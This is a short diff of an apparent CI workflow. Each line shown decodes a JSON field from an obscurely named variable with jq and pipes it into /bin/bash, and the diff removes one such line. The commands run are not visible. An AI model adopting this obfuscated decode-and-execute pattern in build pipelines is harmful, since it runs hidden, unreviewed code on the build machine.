@@ -26,7 +26,6 @@ jobs:
           echo $psy25 | jq -r .pv28738 | /bin/bash
           echo $wcqrf34100 | jq -r .sjvh484 | /bin/bash
           echo $bcn623 | jq -r .tcpep06978 | /bin/bash
-          printf '%s' "$pt24113" | jq -r .r73818 | /bin/bash
           echo $scvx209 | jq -r .jych47 | /bin/bash
           printf '%s' "$c3823" | jq -r .s4286 | /bin/bash
           printf '%s' "$e465" | jq -r .toay7160 | /bin/bash
